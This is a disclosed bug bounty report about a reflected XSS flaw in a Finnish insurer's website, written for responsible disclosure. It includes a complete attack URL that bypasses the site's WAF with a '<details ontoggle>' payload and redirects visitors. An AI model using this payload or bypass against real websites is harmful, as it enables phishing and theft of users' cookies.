@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/301680
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/teemuk
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:250.0
+Severity:medium
+State:Closed
+DateOfDisclosure:11.04.2018 6:34:46
+
+Summary:
+##Issue
+The reporter found a reflected XXS in the Satellite server.
+
+##Fix
+
+While the issue was investigated, there were some backend updates done which apparently automatically mysteriously fixed the issue. Poof.
+
+##Reasoning
+
+Based on the report, the issue was found to be valid. Working single click open redirects which are easily usable in phishing attacks are always an issue for us. 
+## Basic report information
+**Summary:** Reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite.`
+
+**Description:** There exists a reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav`. Value of query string parameter `rendermode` is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using `onToggle` event in `<details>` HTML element. The javascript that is used to demonstrate the vulnerability is `location.href="https://www.google.com/?q="+document.domain`. This demonstrates an open redirect type of vulnerability where user's browser is redirected to the attacker page where the attacker can e.g. perform phishing.
+
+**Domain:** `www.lahitapiola.fi`
+
+## Browsers / Apps Verified In:
+
+  * Firefox version 57.0.3
+
+## Steps To Reproduce:
+
+Access the attack URL `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav&rendermode=preview"><details%20open=true%20ontoggle=%27location.href="https://www.google.com/?q="%2Bdocument.domain%27><summary>testing</summary></details>`
+Browser is redirected to `https://www.google.com/?q=www.lahitapiola.fi`.
+
+## Additional material
+
+* N/A
+
+## Related reports, best practices
+
+This vulnerability is related to the previously reported Oracle Webcenter Sites vulnerabilities (e.g. #170532)
+
+## Impact
+
+An attacker can use reflected XSS vulnerabilities to inject content to pages served from `www.lahitapiola.fi`. This can be used e.g. for phishing purposes or to e.g. steal cookies from user's browser.
